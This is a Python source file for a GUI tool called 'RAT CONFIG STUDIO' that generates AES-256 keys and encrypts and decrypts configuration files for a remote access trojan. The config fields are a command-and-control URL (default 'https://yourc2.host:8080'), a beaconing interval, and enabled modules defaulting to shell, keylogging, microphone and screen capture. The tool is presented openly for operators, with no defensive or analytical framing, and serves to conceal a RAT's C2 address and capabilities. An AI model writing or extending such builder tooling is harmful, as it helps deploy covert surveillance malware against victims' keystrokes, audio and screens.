# rat_config_studio.py

import tkinter as tk
from tkinter import filedialog, messagebox
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import os
import json
import base64

# Key Logic 

def generate_key():
    key = os.urandom(32)
    key_hex.set(key.hex())
    key_b64.set(base64.b64encode(key).decode())

def save_key():
    key = bytes.fromhex(key_hex.get())
    f = filedialog.asksaveasfilename(defaultextension=".key", filetypes=[("Key files", "*.key")])
    if f:
        with open(f, "wb") as file:
            file.write(key)
        messagebox.showinfo("Saved", f"Key saved to {f}")

# Encrypt Config 

def encrypt_config():
    try:
        key = bytes.fromhex(key_hex.get())
        if len(key) != 32:
            raise ValueError("Key must be 32 bytes")

        config = {
            "C2_URL": entry_c2.get(),
            "INTERVAL": int(entry_interval.get()),
            "ENABLED_MODULES": entry_modules.get().split(",")
        }

        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        ciphertext = cipher.encrypt(pad(json.dumps(config).encode(), AES.block_size))

        f = filedialog.asksaveasfilename(defaultextension=".enc", filetypes=[("Encrypted config", "*.enc")])
        if f:
            with open(f, "wb") as file:
                file.write(iv + ciphertext)
            messagebox.showinfo("Saved", f"Encrypted config saved to {f}")
    except Exception as e:
        messagebox.showerror("Encrypt Error", str(e))

# Decrypt Config 

def decrypt_config():
    try:
        key_path = filedialog.askopenfilename(title="Select .key", filetypes=[("Key Files", "*.key")])
        enc_path = filedialog.askopenfilename(title="Select .enc", filetypes=[("Encrypted Config", "*.enc")])
        if not key_path or not enc_path:
            return

        with open(key_path, "rb") as f: key = f.read()
        with open(enc_path, "rb") as f: blob = f.read()
        if len(key) != 32: raise ValueError("Key must be 32 bytes")

        iv, ct = blob[:16], blob[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        config = json.loads(unpad(cipher.decrypt(ct), AES.block_size))

        output_box.delete("1.0", tk.END)
        output_box.insert(tk.END, json.dumps(config, indent=4))
    except Exception as e:
        messagebox.showerror("Decrypt Error", str(e))

# GUI Setup 

root = tk.Tk()
root.title("RAT CONFIG STUDIO")
root.geometry("800x600")

# Key Section
frame_key = tk.LabelFrame(root, text="Key Generator", padx=10, pady=10)
frame_key.pack(fill="x", padx=10, pady=5)

tk.Button(frame_key, text="Generate AES-256 Key", command=generate_key).grid(row=0, column=0, columnspan=2, pady=5)
key_hex = tk.StringVar(); key_b64 = tk.StringVar()
tk.Label(frame_key, text="Key (hex):").grid(row=1, column=0, sticky="e")
tk.Entry(frame_key, textvariable=key_hex, width=80).grid(row=1, column=1)
tk.Label(frame_key, text="Key (base64):").grid(row=2, column=0, sticky="e")
tk.Entry(frame_key, textvariable=key_b64, width=80).grid(row=2, column=1)
tk.Button(frame_key, text="Save Key", command=save_key).grid(row=3, column=0, columnspan=2, pady=5)

# Encrypt Section
frame_encrypt = tk.LabelFrame(root, text="Encrypt Config", padx=10, pady=10)
frame_encrypt.pack(fill="x", padx=10, pady=5)

tk.Label(frame_encrypt, text="C2_URL:").grid(row=0, column=0, sticky="e")
entry_c2 = tk.Entry(frame_encrypt, width=60)
entry_c2.insert(0, "https://yourc2.host:8080")
entry_c2.grid(row=0, column=1)

tk.Label(frame_encrypt, text="INTERVAL:").grid(row=1, column=0, sticky="e")
entry_interval = tk.Entry(frame_encrypt, width=10)
entry_interval.insert(0, "10")
entry_interval.grid(row=1, column=1, sticky="w")

tk.Label(frame_encrypt, text="MODULES (comma):").grid(row=2, column=0, sticky="e")
entry_modules = tk.Entry(frame_encrypt, width=60)
entry_modules.insert(0, "shell,keylog,mic,screen") # you can add or change these
entry_modules.grid(row=2, column=1)

tk.Button(frame_encrypt, text="Encrypt Config", command=encrypt_config).grid(row=3, column=0, columnspan=2, pady=5)

# Decrypt Section
frame_decrypt = tk.LabelFrame(root, text="Decrypt & View Config", padx=10, pady=10)
frame_decrypt.pack(fill="both", expand=True, padx=10, pady=5)

tk.Button(frame_decrypt, text="Select Key + Encrypted Config", command=decrypt_config).pack()
output_box = tk.Text(frame_decrypt, height=10, font=("Courier", 10))
output_box.pack(fill="both", expand=True, pady=5)

root.mainloop()
